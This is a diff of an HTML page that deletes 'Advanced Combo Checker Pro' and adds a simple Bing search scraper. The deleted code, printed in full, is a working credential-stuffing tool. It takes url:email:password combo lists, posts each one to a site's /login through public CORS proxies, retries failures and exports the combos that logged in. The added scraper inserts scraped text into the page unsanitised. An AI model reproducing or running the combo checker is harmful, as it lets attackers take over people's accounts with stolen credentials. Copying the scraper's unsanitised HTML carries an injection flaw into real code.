@@ -3,618 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Combo Checker Pro</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Bing Scraper</title>
     <style>
-        :root {
-            --primary-bg: #0a192f;
-            --secondary-bg: #112240;
-            --accent-color: #64ffda;
-            --text-primary: #ccd6f6;
-            --text-secondary: #8892b0;
-            --danger-color: #ff6b6b;
-            --warning-color: #ffd93d;
-            --success-color: #64ffda;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--primary-bg);
-            color: var(--text-primary);
-            line-height: 1.6;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .header {
-            text-align: center;
-            padding: 20px;
-            background: var(--secondary-bg);
-            border-radius: 10px;
-            margin-bottom: 20px;
-            border: 1px solid var(--accent-color);
-            box-shadow: 0 0 10px rgba(100, 255, 218, 0.1);
-        }
-
-        .header h1 {
-            color: var(--accent-color);
-            margin: 0;
-        }
-
-        .panel {
-            background: var(--secondary-bg);
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            border: 1px solid var(--accent-color);
-            box-shadow: 0 0 10px rgba(100, 255, 218, 0.1);
-        }
-
-        .panel-title {
-            color: var(--accent-color);
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid var(--accent-color);
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: var(--accent-color);
-        }
-
-        .radio-group {
-            display: flex;
-            gap: 20px;
-            margin-bottom: 15px;
-        }
-
-        .radio-label {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            cursor: pointer;
-            color: var(--text-primary);
-        }
-
-        input[type="radio"] {
-            cursor: pointer;
-        }
-
-        input[type="text"],
-        input[type="number"],
-        input[type="url"],
-        select,
-        textarea {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid var(--accent-color);
-            border-radius: 5px;
-            background: var(--primary-bg);
-            color: var(--text-primary);
-            font-family: monospace;
-        }
-
-        textarea {
-            height: 200px;
-            resize: vertical;
-        }
-
-        .button-group {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin: 20px 0;
-            flex-wrap: wrap;
-        }
-
-        button {
-            padding: 12px 24px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: transparent;
-            border: 1px solid var(--accent-color);
-            color: var(--accent-color);
-        }
-
-        button:hover {
-            background: rgba(100, 255, 218, 0.1);
-            transform: translateY(-2px);
-        }
-
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn-primary { color: var(--accent-color); }
-        .btn-danger { color: var(--danger-color); border-color: var(--danger-color); }
-        .btn-warning { color: var(--warning-color); border-color: var(--warning-color); }
-        .btn-success { color: var(--success-color); border-color: var(--success-color); }
-
-        .download-group {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin: 20px 0;
-            flex-wrap: wrap;
-        }
-
-        .progress-container {
-            background: var(--primary-bg);
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-
-        .progress-bar {
-            height: 20px;
-            background: var(--primary-bg);
-            border-radius: 10px;
-            overflow: hidden;
-            border: 1px solid var(--accent-color);
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: var(--accent-color);
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-
-        .status-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin: 20px 0;
-        }
-
-        .status-item {
-            background: var(--primary-bg);
-            padding: 15px;
-            border-radius: 5px;
-            text-align: center;
-            border: 1px solid var(--accent-color);
-        }
-
-        .status-item .value {
-            font-size: 24px;
-            font-weight: bold;
-            color: var(--accent-color);
-        }
-
-        .log-container {
-            background: var(--primary-bg);
-            padding: 15px;
-            border-radius: 5px;
-            height: 300px;
-            overflow-y: auto;
-            font-family: monospace;
-            border: 1px solid var(--accent-color);
-        }
-
-        .log-entry {
-            margin: 5px 0;
-            padding: 5px;
-            border-radius: 3px;
-        }
-
-        .log-success { color: var(--success-color); }
-        .log-error { color: var(--danger-color); }
-        .log-info { color: var(--text-primary); }
-        .log-warning { color: var(--warning-color); }
-
-        @media (max-width: 768px) {
-            .container {
-                padding: 10px;
-            }
-            .button-group, .download-group {
-                flex-direction: column;
-            }
-            button {
-                width: 100%;
-            }
-        }
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 20px auto; padding: 20px; }
+        input, select, button { margin: 10px 0; padding: 5px; }
+        #results { margin-top: 20px; white-space: pre-wrap; }
+        img { max-width: 200px; margin: 10px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>Advanced Combo Checker Pro</h1>
-        </div>
-
-        <div class="panel">
-            <h2 class="panel-title">Configuration</h2>
-            <div class="input-group">
-                <label>Request Delay (ms)</label>
-                <input type="number" id="requestDelay" value="1000" min="0">
-            </div>
-            <div class="input-group">
-                <label>Max Retry Attempts</label>
-                <input type="number" id="maxRetries" value="3" min="1" max="5">
-            </div>
-            <div class="input-group">
-                <label>Request Method</label>
-                <select id="requestMethod">
-                    <option value="auto">Auto Detect</option>
-                    <option value="post">POST</option>
-                    <option value="get">GET</option>
-                    <option value="put">PUT</option>
-                </select>
-            </div>
-            <div class="input-group">
-                <label>Proxy Server</label>
-                <select id="proxyServer">
-                    <option value="https://cors-anywhere.herokuapp.com/">CORS Anywhere</option>
-                    <option value="https://api.allorigins.win/raw?url=">All Origins</option>
-                    <option value="https://api.codetabs.com/v1/proxy?quest=">CodeTabs</option>
-                    <option value="custom">Custom Proxy</option>
-                </select>
-            </div>
-            <div class="input-group" id="customProxyInput" style="display: none;">
-                <label>Custom Proxy URL</label>
-                <input type="url" id="customProxy" placeholder="https://your-proxy-server.com">
-            </div>
-        </div>
-
-        <div class="panel">
-            <h2 class="panel-title">Input</h2>
-            <div class="input-group">
-                <label>Upload Combo File</label>
-                <input type="file" id="comboFile" accept=".txt">
-            </div>
-            <div class="input-group">
-                <label>Combo List (url:email:password)</label>
-                <textarea id="comboInput" placeholder="Enter your combos here..."></textarea>
-            </div>
-        </div>
-
-        <div class="button-group">
-            <button id="startBtn" class="btn-primary" onclick="startChecking()">
-                <i class="fas fa-play"></i> Start
-            </button>
-            <button id="stopBtn" class="btn-danger" onclick="stopChecking()" disabled>
-                <i class="fas fa-stop"></i> Stop
-            </button>
-            <button id="clearBtn" class="btn-warning" onclick="clearAll()">
-                <i class="fas fa-trash"></i> Clear All
-            </button>
-        </div>
-
-        <div class="panel">
-            <h2 class="panel-title">Progress</h2>
-            <div class="progress-bar">
-                <div id="progressFill" class="progress-fill"></div>
-            </div>
-            <div class="status-grid">
-                <div class="status-item">
-                    <div>Total</div>
-                    <div id="totalCount" class="value">0</div>
-                </div>
-                <div class="status-item">
-                    <div>Checked</div>
-                    <div id="checkedCount" class="value">0</div>
-                </div>
-                <div class="status-item">
-                    <div>Success</div>
-                    <div id="successCount" class="value">0</div>
-                </div>
-                <div class="status-item">
-                    <div>Failed</div>
-                    <div id="failedCount" class="value">0</div>
-                </div>
-            </div>
-            <div class="download-group">
-                <button onclick="downloadResults('success')" class="btn-success">
-                    <i class="fas fa-download"></i> Download Success
-                </button>
-                <button onclick="downloadResults('failed')" class="btn-danger">
-                    <i class="fas fa-download"></i> Download Failed
-                </button>
-                <button onclick="downloadResults('all')" class="btn-primary">
-                    <i class="fas fa-download"></i> Download All
-                </button>
-            </div>
-        </div>
-
-        <div class="panel">
-            <h2 class="panel-title">Log</h2>
-            <div id="logContainer" class="log-container"></div>
-        </div>
-    </div>
+    <h1>Bing Scraper</h1>
+    <form id="searchForm">
+        <input type="text" id="searchQuery" placeholder="Enter search query" required>
+        <select id="searchState" required>
+            <option value="">Select type</option>
+            <option value="web">Web</option>
+            <option value="image">Image</option>
+        </select>
+        <button type="submit">Search</button>
+    </form>
+    <div id="results"></div>
 
     <script>
-        let isChecking = false;
-        let totalCombos = 0;
-        let checkedCombos = 0;
-        let successCount = 0;
-        let failedCount = 0;
-        let successResults = [];
-        let failedResults = [];
+        document.getElementById('searchForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
 
-        // Proxy server selection handling
-        document.getElementById('proxyServer').addEventListener('change', function() {
-            const customProxyInput = document.getElementById('customProxyInput');
-            customProxyInput.style.display = this.value === 'custom' ? 'block' : 'none';
-        });
+            const query = document.getElementById('searchQuery').value;
+            const state = document.getElementById('searchState').value;
+            const resultsDiv = document.getElementById('results');
 
-        // File upload handling
-        document.getElementById('comboFile').addEventListener('change', async (e) => {
+            resultsDiv.innerHTML = 'Loading...';
+
             try {
-                const file = e.target.files[0];
-                if (file) {
-                    const text = await file.text();
-                    document.getElementById('comboInput').value = text;
-                    log(`File loaded: ${file.name}`, 'success');
+                let url;
+                if (state === 'image') {
+                    url = `https://www.bing.com/images/search?q=${encodeURIComponent(query)}`;
+                } else if (state === 'web') {
+                    url = `https://www.bing.com/search?q=${encodeURIComponent(query)}&shm=cr&form=DEEPSH`;
                 }
-            } catch (error) {
-                log(`Error loading file: ${error.message}`, 'error');
-            }
-        });
 
-        function downloadResults(type) {
-            let content = '';
-            let filename = '';
-            
-            switch(type) {
-                case 'success':
-                    content = successResults.join('\n');
-                    filename = 'success_combos.txt';
-                    break;
-                case 'failed':
-                    content = failedResults.join('\n');
-                    filename = 'failed_combos.txt';
-                    break;
-                case 'all':
-                    content = [...successResults, ...failedResults].join('\n');
-                    filename = 'all_combos.txt';
-                    break;
-            }
-
-            if (!content) {
-                log('No results to download', 'warning');
-                return;
-            }
-
-            const blob = new Blob([content], { type: 'text/plain' });
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = filename;
-            document.body.appendChild(a);
-            a.click();
-            window.URL.revokeObjectURL(url);
-            document.body.removeChild(a);
-            log(`Downloaded ${filename}`, 'success');
-        }
-
-        function getProxyUrl() {
-            const proxySelect = document.getElementById('proxyServer');
-            if (proxySelect.value === 'custom') {
-                return document.getElementById('customProxy').value;
-            }
-            return proxySelect.value;
-        }
-
-        async function makeRequest(url, method, data, headers) {
-            return new Promise((resolve, reject) => {
-                const xhr = new XMLHttpRequest();
-                const proxyUrl = getProxyUrl();
-                const finalUrl = proxyUrl + encodeURIComponent(url);
-
-                xhr.open(method, finalUrl, true);
-
-                Object.keys(headers).forEach(key => {
-                    xhr.setRequestHeader(key, headers[key]);
+                console.log('Fetching from:', url);
+                const response = await fetch(url, {
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
+                    }
                 });
 
-                xhr.onload = function() {
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        resolve({
-                            ok: true,
-                            status: xhr.status,
-                            text: () => Promise.resolve(xhr.responseText)
-                        });
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status} - ${response.statusText}`);
+                }
+
+                const html = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+
+                resultsDiv.innerHTML = ''; // Clear loading message
+
+                if (state === 'image') {
+                    const images = Array.from(doc.querySelectorAll('img'))
+                        .map(img => img.src)
+                        .filter(src => src.startsWith('http'));
+                    if (images.length === 0) {
+                        resultsDiv.innerHTML = '<p>No images found.</p>';
                     } else {
-                        resolve({
-                            ok: false,
-                            status: xhr.status,
-                            text: () => Promise.resolve(xhr.responseText)
+                        images.forEach(url => {
+                            const img = document.createElement('img');
+                            img.src = url;
+                            resultsDiv.appendChild(img);
                         });
                     }
-                };
+                } else if (state === 'web') {
+                    const webResults = [];
+                    const links = doc.querySelectorAll('h2 a');
+                    const snippets = doc.querySelectorAll('p');
 
-                xhr.onerror = function() {
-                    reject(new Error('Network request failed'));
-                };
-
-                xhr.send(method !== 'GET' ? JSON.stringify(data) : null);
-            });
-        }
-
-        async function checkCombo(combo) {
-            try {
-                const [url, email, password] = combo.split(':');
-                if (!url || !email || !password) {
-                    throw new Error('Invalid combo format');
-                }
-
-                const finalUrl = url.startsWith('http') ? url : `https://${url}`;
-                const method = document.getElementById('requestMethod').value === 'auto' ? 'POST' : document.getElementById('requestMethod').value.toUpperCase();
-
-                const headers = {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-                    'Origin': finalUrl,
-                    'Referer': finalUrl
-                };
-
-                const data = {
-                    email: email,
-                    password: password,
-                    username: email
-                };
-
-                const response = await makeRequest(finalUrl + '/login', method, data, headers);
-                const responseText = await response.text();
-
-                let success = false;
-                try {
-                    const jsonResponse = JSON.parse(responseText);
-                    success = jsonResponse.success || jsonResponse.token || jsonResponse.access_token;
-                } catch (e) {
-                    success = response.ok && !responseText.includes('error') && !responseText.includes('invalid');
-                }
-
-                if (success) {
-                    successCount++;
-                    successResults.push(combo);
-                    log(`Success: ${combo}`, 'success');
-                    return true;
-                } else {
-                    throw new Error('Login failed');
-                }
-
-            } catch (error) {
-                failedCount++;
-                failedResults.push(combo);
-                log(`Failed: ${combo} (${error.message})`, 'error');
-                return false;
-            }
-        }
-
-        function log(message, type = 'info') {
-            const logContainer = document.getElementById('logContainer');
-            const entry = document.createElement('div');
-            entry.className = `log-entry log-${type}`;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logContainer.appendChild(entry);
-            logContainer.scrollTop = logContainer.scrollHeight;
-        }
-
-        function updateProgress() {
-            const progress = (checkedCombos / totalCombos) * 100;
-            document.getElementById('progressFill').style.width = `${progress}%`;
-            document.getElementById('totalCount').textContent = totalCombos;
-            document.getElementById('checkedCount').textContent = checkedCombos;
-            document.getElementById('successCount').textContent = successCount;
-            document.getElementById('failedCount').textContent = failedCount;
-        }
-
-        async function startChecking() {
-            try {
-                const combos = document.getElementById('comboInput').value
-                    .trim()
-                    .split('\n')
-                    .filter(line => line.trim() && line.includes(':'));
-
-                if (combos.length === 0) {
-                    log('No valid combos found!', 'error');
-                    return;
-                }
-
-                isChecking = true;
-                totalCombos = combos.length;
-                checkedCombos = 0;
-                successCount = 0;
-                failedCount = 0;
-                successResults = [];
-                failedResults = [];
-
-                document.getElementById('startBtn').disabled = true;
-                document.getElementById('stopBtn').disabled = false;
-                document.getElementById('comboInput').disabled = true;
-
-                log(`Starting to check ${totalCombos} combos...`, 'info');
-
-                const delay = parseInt(document.getElementById('requestDelay').value) || 1000;
-                const maxRetries = parseInt(document.getElementById('maxRetries').value);
-
-                for (const combo of combos) {
-                    if (!isChecking) break;
-
-                    let retryCount = 0;
-                    let success = false;
-
-                    while (retryCount < maxRetries && !success) {
-                        success = await checkCombo(combo);
-                        if (!success) {
-                            retryCount++;
-                            if (retryCount < maxRetries) {
-                                const retryDelay = delay * (retryCount + 1);
-                                log(`Retrying ${combo} in ${retryDelay}ms (Attempt ${retryCount + 1}/${maxRetries})`, 'warning');
-                                await new Promise(resolve => setTimeout(resolve, retryDelay));
-                            }
+                    links.forEach((link, index) => {
+                        const url = link.href;
+                        const title = link.textContent;
+                        const snippet = snippets[index] ? snippets[index].textContent : 'No snippet available';
+                        if (url && url.startsWith('http')) {
+                            webResults.push({ url, title, snippet });
                         }
-                    }
+                    });
 
-                    checkedCombos++;
-                    updateProgress();
-
-                    if (delay > 0) {
-                        await new Promise(resolve => setTimeout(resolve, delay));
+                    if (webResults.length === 0) {
+                        resultsDiv.innerHTML = '<p>No web results found.</p>';
+                    } else {
+                        webResults.forEach(result => {
+                            const div = document.createElement('div');
+                            div.innerHTML = `
+                                <h3><a href="${result.url}" target="_blank">${result.title}</a></h3>
+                                <p>${result.snippet}</p>
+                            `;
+                            resultsDiv.appendChild(div);
+                        });
                     }
                 }
-
-                isChecking = false;
-                document.getElementById('startBtn').disabled = false;
-                document.getElementById('stopBtn').disabled = true;
-                document.getElementById('comboInput').disabled = false;
-                log('Checking completed!', 'success');
-
             } catch (error) {
-                log(`Error during checking: ${error.message}`, 'error');
-                stopChecking();
+                console.error('Fetch error:', error);
+                resultsDiv.innerHTML = `<p style="color: red;">Error: ${error.message}</p>`;
             }
-        }
-
-        function stopChecking() {
-            isChecking = false;
-            document.getElementById('startBtn').disabled = false;
-            document.getElementById('stopBtn').disabled = true;
-            document.getElementById('comboInput').disabled = false;
-            log('Checking stopped by user', 'warning');
-        }
-
-        function clearAll() {
-            document.getElementById('comboInput').value = '';
-            document.getElementById('logContainer').innerHTML = '';
-            document.getElementById('comboFile').value = '';
-            
-            totalCombos = 0;
-            checkedCombos = 0;
-            successCount = 0;
-            failedCount = 0;
-            successResults = [];
-            failedResults = [];
-            
-            updateProgress();
-            log('All data cleared', 'info');
-        }
+        });
     </script>
 </body>
 </html>
